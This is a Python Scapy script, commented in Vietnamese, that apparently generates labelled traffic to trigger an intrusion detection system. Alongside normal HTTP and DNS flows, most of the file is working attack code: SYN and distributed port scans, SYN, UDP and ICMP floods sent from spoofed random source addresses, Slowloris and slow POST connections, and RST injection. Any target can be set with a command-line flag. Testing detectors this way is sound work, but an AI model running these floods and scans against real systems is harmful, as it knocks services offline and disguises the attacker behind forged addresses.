#!/usr/bin/env python3
# simulate_traffic_v3.py — Heavy traffic để trigger IDS detection
# sudo python3 simulate_traffic_v3.py --iface wlan0

from scapy.all import *
import argparse, time, random, threading, sys

# ─────────────────────────────────────────────────────────────────────────────
#  Auto-detect network info
# ─────────────────────────────────────────────────────────────────────────────
def setup_network(iface):
    src_ip  = get_if_addr(iface)
    src_mac = get_if_hwaddr(iface)

    # Tìm gateway
    try:
        import netifaces
        gws = netifaces.gateways()
        dst_ip = gws['default'][netifaces.AF_INET][0]
    except Exception:
        # fallback: lấy .1 của subnet
        parts = src_ip.split('.')
        dst_ip = '.'.join(parts[:3]) + '.1'

    # ARP để lấy MAC gateway
    try:
        ans = srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=dst_ip),
                   iface=iface, timeout=2, verbose=False)
        dst_mac = ans[ARP].hwsrc if ans else "ff:ff:ff:ff:ff:ff"
    except Exception:
        dst_mac = "ff:ff:ff:ff:ff:ff"

    return src_ip, src_mac, dst_ip, dst_mac

# ─────────────────────────────────────────────────────────────────────────────
#  Helper: build Ether header
# ─────────────────────────────────────────────────────────────────────────────
def E(src_mac, dst_mac):
    return Ether(src=src_mac, dst=dst_mac)

def rand_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rand_port():
    return random.randint(1024, 65535)

# ═════════════════════════════════════════════════════════════════════════════
#  NORMAL TRAFFIC
# ═════════════════════════════════════════════════════════════════════════════

def send_normal_bulk(iface, src_ip, src_mac, dst_ip, dst_mac, count=50):
    """
    Gửi count luồng HTTP hoàn chỉnh (SYN→ACK→DATA×N→FIN)
    Mỗi flow có ~10-20 packets → đủ để IDS build flow stats
    """
    print(f"[NORMAL] HTTP bulk flows ({count} flows × ~15 pkts)...")
    pkts = []
    for _ in range(count):
        sport = rand_port()
        seq   = random.randint(10000, 99999)
        ack   = random.randint(10000, 99999)
        # SYN
        pkts.append(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
                    TCP(sport=sport,dport=80,flags="S",seq=seq))
        # ACK
        pkts.append(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
                    TCP(sport=sport,dport=80,flags="A",seq=seq+1,ack=ack+1))
        # DATA × 8 (simulate real HTTP exchange)
        for j in range(8):
            payload = b"GET / HTTP/1.1\r\nHost: test.local\r\n\r\n" if j==0 \
                      else (b"X" * random.randint(64, 512))
            pkts.append(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
                        TCP(sport=sport,dport=80,flags="PA",
                            seq=seq+1+j*100,ack=ack+1)/Raw(payload))
            # Server reply
            pkts.append(E(dst_mac,src_mac)/IP(src=dst_ip,dst=src_ip)/
                        TCP(sport=80,dport=sport,flags="PA",
                            seq=ack+1+j*200,ack=seq+2+j*100)/
                        Raw(b"HTTP/1.1 200 OK\r\n\r\n" + b"A"*100))
        # FIN
        pkts.append(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
                    TCP(sport=sport,dport=80,flags="FA",seq=seq+900,ack=ack+1))
        pkts.append(E(dst_mac,src_mac)/IP(src=dst_ip,dst=src_ip)/
                    TCP(sport=80,dport=sport,flags="FA",seq=ack+900,ack=seq+901))

    sendp(pkts, iface=iface, verbose=False, inter=0.001)
    print(f"  → {len(pkts)} packets sent ({count} SF flows)")


def send_normal_udp_dns(iface, src_ip, src_mac, dst_ip, dst_mac, count=30):
    """DNS queries bình thường"""
    print(f"[NORMAL] DNS queries ({count})...")
    pkts = []
    domains = [b"google.com", b"facebook.com", b"youtube.com",
               b"github.com", b"stackoverflow.com"]
    for i in range(count):
        pkts.append(E(src_mac,dst_mac)/IP(src=src_ip,dst="8.8.8.8")/
                    UDP(sport=rand_port(),dport=53)/
                    DNS(rd=1,qd=DNSQR(qname=domains[i%len(domains)])))
    sendp(pkts, iface=iface, verbose=False, inter=0.005)
    print(f"  → {len(pkts)} DNS packets")


# ═════════════════════════════════════════════════════════════════════════════
#  PORT SCAN — cần đủ SYN không có ACK trả về
# ═════════════════════════════════════════════════════════════════════════════

def send_port_scan_heavy(iface, src_ip, src_mac, dst_ip, dst_mac):
    """
    SYN scan 100 ports × 5 lần = 500 SYN không có ACK
    → count cao, srv_count cao, diff_srv_rate cao → PORT_SCAN
    """
    print("[ATTACK] Port scan heavy (500 SYN, no ACK)...")
    ports = list(range(1, 101))  # port 1-100
    pkts  = []
    for _ in range(5):  # lặp 5 lần
        random.shuffle(ports)
        for port in ports:
            pkts.append(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
                        TCP(sport=rand_port(),dport=port,flags="S",
                            seq=random.randint(1000,9999)))
    sendp(pkts, iface=iface, verbose=False, inter=0.001)
    print(f"  → {len(pkts)} SYN sent [S0 state, diff_srv_rate=1.0]")


def send_port_scan_distributed(iface, src_mac, dst_ip, dst_mac):
    """
    Nhiều src IP khác nhau scan cùng 1 dst
    → dst_host_count cao, dst_host_diff_srv_rate cao
    """
    print("[ATTACK] Distributed port scan (50 src IPs × 20 ports)...")
    pkts = []
    for _ in range(50):
        src = rand_ip()
        for port in random.sample(range(1, 1024), 20):
            pkts.append(E(src_mac,dst_mac)/IP(src=src,dst=dst_ip)/
                        TCP(sport=rand_port(),dport=port,flags="S"))
    sendp(pkts, iface=iface, verbose=False, inter=0.001)
    print(f"  → {len(pkts)} pkts from 50 IPs")


# ═════════════════════════════════════════════════════════════════════════════
#  SYN FLOOD — count rất cao, serror_rate cao
# ═════════════════════════════════════════════════════════════════════════════

def send_syn_flood_heavy(iface, src_mac, dst_ip, dst_mac, count=1000):
    """
    1000 SYN từ random IP → port 80
    → count=1000, serror_rate≈1.0, same_srv_rate≈1.0
    → DDOS_VOLUMETRIC
    """
    print(f"[ATTACK] SYN flood heavy ({count} pkts → port 80)...")
    pkts = []
    for _ in range(count):
        pkts.append(E(src_mac,dst_mac)/IP(src=rand_ip(),dst=dst_ip)/
                    TCP(sport=rand_port(),dport=80,flags="S",
                        seq=random.randint(1000,999999)))
    sendp(pkts, iface=iface, verbose=False, inter=0.0005)
    print(f"  → {count} SYN [serror_rate≈1.0, count={count}]")


def send_syn_flood_multi_port(iface, src_mac, dst_ip, dst_mac, count=500):
    """SYN flood nhiều port → diff_srv_rate cao"""
    print(f"[ATTACK] SYN flood multi-port ({count} pkts)...")
    pkts = []
    ports = [80, 443, 8080, 8443, 3000, 5000, 9000, 9090]
    for _ in range(count):
        pkts.append(E(src_mac,dst_mac)/IP(src=rand_ip(),dst=dst_ip)/
                    TCP(sport=rand_port(),
                        dport=random.choice(ports),
                        flags="S"))
    sendp(pkts, iface=iface, verbose=False, inter=0.001)
    print(f"  → {count} SYN to {len(ports)} ports")


# ═════════════════════════════════════════════════════════════════════════════
#  UDP FLOOD
# ═════════════════════════════════════════════════════════════════════════════

def send_udp_flood_heavy(iface, src_mac, dst_ip, dst_mac, count=500):
    """
    UDP flood lớn → src_bytes cao, count cao
    """
    print(f"[ATTACK] UDP flood heavy ({count} pkts)...")
    pkts = []
    for _ in range(count):
        pkts.append(E(src_mac,dst_mac)/IP(src=rand_ip(),dst=dst_ip)/
                    UDP(sport=rand_port(),
                        dport=random.randint(1,65535))/
                    Raw(b"U" * random.randint(512, 1400)))
    sendp(pkts, iface=iface, verbose=False, inter=0.0005)
    print(f"  → {count} UDP packets")


# ═════════════════════════════════════════════════════════════════════════════
#  SLOWLORIS — nhiều connection, gửi chậm
# ═════════════════════════════════════════════════════════════════════════════

def send_slowloris_heavy(iface, src_ip, src_mac, dst_ip, dst_mac, conn=30):
    """
    30 connection đồng thời, mỗi conn gửi partial header
    → max_concurrent_conn cao, duration dài, dst_bytes thấp
    → SLOW_DDOS
    """
    print(f"[ATTACK] Slowloris heavy ({conn} connections, 10 rounds)...")

    def slow_conn(i):
        sport = 20000 + i
        seq   = random.randint(10000, 99999)
        # SYN
        sendp(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
              TCP(sport=sport,dport=80,flags="S",seq=seq),
              iface=iface, verbose=False)
        time.sleep(0.05)
        # Partial header
        sendp(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
              TCP(sport=sport,dport=80,flags="PA",seq=seq+1)/
              Raw(b"GET / HTTP/1.1\r\nHost: victim.local\r\nX-a: "),
              iface=iface, verbose=False)
        # Gửi từng byte mỗi 1 giây × 10 lần
        for j in range(10):
            time.sleep(1.0)
            sendp(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
                  TCP(sport=sport,dport=80,flags="PA",seq=seq+50+j)/
                  Raw(f"{j}".encode()),
                  iface=iface, verbose=False)

    threads = [threading.Thread(target=slow_conn, args=(i,), daemon=True)
               for i in range(conn)]
    for t in threads: t.start()
    for t in threads: t.join()
    print(f"  → {conn} slow connections done")


# ═════════════════════════════════════════════════════════════════════════════
#  SLOW POST
# ═════════════════════════════════════════════════════════════════════════════

def send_slow_post_heavy(iface, src_ip, src_mac, dst_ip, dst_mac, conn=20):
    """POST body gửi cực chậm"""
    print(f"[ATTACK] Slow POST ({conn} connections)...")

    def slow_post(i):
        sport = 30000 + i
        seq   = random.randint(10000, 99999)
        sendp(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
              TCP(sport=sport,dport=80,flags="S",seq=seq),
              iface=iface, verbose=False)
        time.sleep(0.05)
        # POST header với Content-Length lớn
        header = (b"POST /upload HTTP/1.1\r\n"
                  b"Host: victim.local\r\n"
                  b"Content-Length: 100000\r\n"
                  b"Content-Type: application/x-www-form-urlencoded\r\n\r\n")
        sendp(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
              TCP(sport=sport,dport=80,flags="PA",seq=seq+1)/Raw(header),
              iface=iface, verbose=False)
        # Gửi body cực chậm
        for j in range(8):
            time.sleep(1.5)
            sendp(E(src_mac,dst_mac)/IP(src=src_ip,dst=dst_ip)/
                  TCP(sport=sport,dport=80,flags="PA",seq=seq+200+j*10)/
                  Raw(b"data=" + b"x"*10),
                  iface=iface, verbose=False)

    threads = [threading.Thread(target=slow_post, args=(i,), daemon=True)
               for i in range(conn)]
    for t in threads: t.start()
    for t in threads: t.join()
    print(f"  → {conn} slow POST done")


# ═════════════════════════════════════════════════════════════════════════════
#  RST / REJ flows
# ═════════════════════════════════════════════════════════════════════════════

def send_rst_heavy(iface, src_ip, src_mac, dst_ip, dst_mac, count=100):
    """
    Nhiều RST → rerror_rate cao → anomaly
    """
    print(f"[ATTACK] RST injection heavy ({count} pkts)...")
    pkts = []
    for _ in range(count):
        pkts.append(E(src_mac,dst_mac)/IP(src=rand_ip(),dst=dst_ip)/
                    TCP(sport=rand_port(),
                        dport=random.choice([80,443,22,21,25]),
                        flags="R",
                        seq=random.randint(1000,999999)))
    sendp(pkts, iface=iface, verbose=False, inter=0.002)
    print(f"  → {count} RST packets [rerror_rate↑]")


# ═════════════════════════════════════════════════════════════════════════════
#  ICMP FLOOD
# ═════════════════════════════════════════════════════════════════════════════

def send_icmp_flood(iface, src_mac, dst_ip, dst_mac, count=300):
    print(f"[ATTACK] ICMP flood ({count} pkts)...")
    pkts = []
    for _ in range(count):
        pkts.append(E(src_mac,dst_mac)/IP(src=rand_ip(),dst=dst_ip)/
                    ICMP()/Raw(b"X"*64))
    sendp(pkts, iface=iface, verbose=False, inter=0.001)
    print(f"  → {count} ICMP packets")


# ═════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═════════════════════════════════════════════════════════════════════════════

SCENARIOS = {
    "normal"    : ["normal_http", "normal_dns"],
    "portscan"  : ["portscan_heavy", "portscan_dist"],
    "synflood"  : ["synflood_heavy", "synflood_multi"],
    "udpflood"  : ["udpflood_heavy"],
    "slowloris" : ["slowloris_heavy"],
    "slowpost"  : ["slowpost_heavy"],
    "rst"       : ["rst_heavy"],
    "icmpflood" : ["icmpflood"],
    "all"       : ["normal_http", "normal_dns",
                   "portscan_heavy", "portscan_dist",
                   "synflood_heavy", "synflood_multi",
                   "udpflood_heavy",
                   "rst_heavy", "icmpflood",
                   "slowloris_heavy", "slowpost_heavy"],
    "attack"    : ["portscan_heavy", "portscan_dist",
                   "synflood_heavy", "synflood_multi",
                   "udpflood_heavy", "rst_heavy", "icmpflood"],
}

def run_scenario(name, iface, src_ip, src_mac, dst_ip, dst_mac):
    fns = {
        "normal_http"    : lambda: send_normal_bulk(iface,src_ip,src_mac,dst_ip,dst_mac),
        "normal_dns"     : lambda: send_normal_udp_dns(iface,src_ip,src_mac,dst_ip,dst_mac),
        "portscan_heavy" : lambda: send_port_scan_heavy(iface,src_ip,src_mac,dst_ip,dst_mac),
        "portscan_dist"  : lambda: send_port_scan_distributed(iface,src_mac,dst_ip,dst_mac),
        "synflood_heavy" : lambda: send_syn_flood_heavy(iface,src_mac,dst_ip,dst_mac),
        "synflood_multi" : lambda: send_syn_flood_multi_port(iface,src_mac,dst_ip,dst_mac),
        "udpflood_heavy" : lambda: send_udp_flood_heavy(iface,src_mac,dst_ip,dst_mac),
        "slowloris_heavy": lambda: send_slowloris_heavy(iface,src_ip,src_mac,dst_ip,dst_mac),
        "slowpost_heavy" : lambda: send_slow_post_heavy(iface,src_ip,src_mac,dst_ip,dst_mac),
        "rst_heavy"      : lambda: send_rst_heavy(iface,src_ip,src_mac,dst_ip,dst_mac),
        "icmpflood"      : lambda: send_icmp_flood(iface,src_mac,dst_ip,dst_mac),
    }
    fn = fns.get(name)
    if fn:
        fn()
        time.sleep(0.3)

def main():
    parser = argparse.ArgumentParser(
        description="Network IDS Simulator v3 — Heavy Traffic")
    parser.add_argument("--iface",    default="wlan0",
                        help="Network interface")
    parser.add_argument("--src-ip",   default="",
                        help="Override source IP")
    parser.add_argument("--dst-ip",   default="",
                        help="Override destination IP")
    parser.add_argument("--scenario", default="all",
                        choices=list(SCENARIOS.keys()),
                        help="Traffic scenario")
    parser.add_argument("--repeat",   type=int, default=1,
                        help="Repeat count")
    parser.add_argument("--delay",    type=float, default=1.0,
                        help="Delay between repeats (sec)")
    args = parser.parse_args()

    # Setup network
    src_ip, src_mac, dst_ip, dst_mac = setup_network(args.iface)
    if args.src_ip: src_ip = args.src_ip
    if args.dst_ip: dst_ip = args.dst_ip

    print("=" * 55)
    print("  Network IDS Simulator v3 — Heavy Traffic")
    print("=" * 55)
    print(f"  Interface : {args.iface}")
    print(f"  SRC       : {src_ip}  ({src_mac})")
    print(f"  DST       : {dst_ip}  ({dst_mac})")
    print(f"  Scenario  : {args.scenario}")
    print(f"  Repeat    : {args.repeat}x")
    print(f"  Steps     : {SCENARIOS[args.scenario]}")
    print("=" * 55)
    print()

    for r in range(args.repeat):
        if args.repeat > 1:
            print(f"\n{'─'*40}")
            print(f"  Round {r+1}/{args.repeat}")
            print(f"{'─'*40}")
        for step in SCENARIOS[args.scenario]:
            run_scenario(step, args.iface,
                         src_ip, src_mac, dst_ip, dst_mac)
        if r < args.repeat - 1:
            print(f"\n  [sleep {args.delay}s before next round]")
            time.sleep(args.delay)

    print("\n" + "=" * 55)
    print("  Done!")
    print("=" * 55)

if __name__ == "__main__":
    main()
